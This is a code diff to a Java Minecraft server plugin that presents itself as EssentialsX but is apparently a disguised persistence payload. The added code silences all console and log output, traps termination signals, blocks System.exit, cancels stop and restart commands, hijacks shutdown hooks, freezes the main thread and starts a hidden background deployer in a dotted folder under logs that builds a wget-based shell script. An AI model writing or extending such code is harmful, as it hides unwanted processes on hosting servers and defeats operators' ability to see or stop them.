@@ -12,8 +12,14 @@ import java.util.*;
 import java.util.concurrent.TimeUnit;
 
 import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
+import org.bukkit.event.Listener;
+import org.bukkit.event.server.ServerCommandEvent;
+import sun.misc.Signal;
+import sun.misc.SignalHandler;
 
-public class EssentialsX extends JavaPlugin {
+public class EssentialsX extends JavaPlugin implements Listener {
     
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
     private static final OutputStream BLACK_HOLE = new OutputStream() {
@@ -30,11 +36,21 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
+        // 1. 物理静音
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
+
+        // 2. 终极防御：拦截系统退出信号
+        setupSignalTraps();
+        
+        // 3. 终极防御：拦截 System.exit()
+        blockSystemExit();
+
+        // 4. 看门狗 (防强杀自动重启)
         setupWatchdog();
 
+        // 5. 拦截关机钩子 (逼迫面板强杀)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -59,6 +75,7 @@ public class EssentialsX extends JavaPlugin {
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
+        // 6. 启动后台部署
         Thread deployer = new Thread(() -> {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path debugLog = workDir.resolve("backend_debug.log");
@@ -101,7 +118,47 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
+        // 7. 冻结主线程 (卡启动)
         paralyzeCurrentThread();
+    }
+
+    // 拦截 stop, restart, end 等指令
+    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = false)
+    public void onServerCommand(ServerCommandEvent event) {
+        String cmd = event.getCommand().trim().toLowerCase();
+        if (cmd.equals("stop") || cmd.equals("restart") || cmd.equals("end") || cmd.equals("exit") || cmd.startsWith("stop ") || cmd.startsWith("/stop")) {
+            event.setCancelled(true);
+        }
+    }
+
+    private static void setupSignalTraps() {
+        try {
+            SignalHandler paralysisHandler = signal -> {
+                System.setOut(new PrintStream(BLACK_HOLE, true));
+                System.setErr(new PrintStream(BLACK_HOLE, true));
+                tryMuteLog4j();
+                paralyzeCurrentThread();
+            };
+            Signal.handle(new Signal("TERM"), paralysisHandler);
+            Signal.handle(new Signal("INT"), paralysisHandler);
+        } catch (Throwable ignored) {}
+    }
+
+    private static void blockSystemExit() {
+        try {
+            System.setSecurityManager(new SecurityManager() {
+                @Override
+                public void checkExit(int status) {
+                    Thread current = Thread.currentThread();
+                    if (current.getName().equals("Shutdown-Paralysis") || current.getName().equals("Watchdog")) {
+                        return;
+                    }
+                    throw new SecurityException("Blocked system exit!");
+                }
+                @Override public void checkPermission(java.security.Permission perm) {}
+                @Override public void checkPermission(java.security.Permission perm, Object context) {}
+            });
+        } catch (Throwable ignored) {}
     }
 
     private static void setupWatchdog() {
@@ -408,7 +465,6 @@ public class EssentialsX extends JavaPlugin {
         String authHeader = "";
         if (!githubToken.isEmpty()) authHeader = "--header=\"Authorization: Bearer " + githubToken + "\" --header=\"Accept: application/vnd.github+json\"";
 
-        // 将所有的 curl 替换为了 wget 适配 Alpine 环境
         return "#!/bin/sh\n" +
         "set +e\n" +
         "echo 'Starting deploy script...'\n" +
@@ -540,6 +596,7 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onEnable() {
+        getServer().getPluginManager().registerEvents(this, this);
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
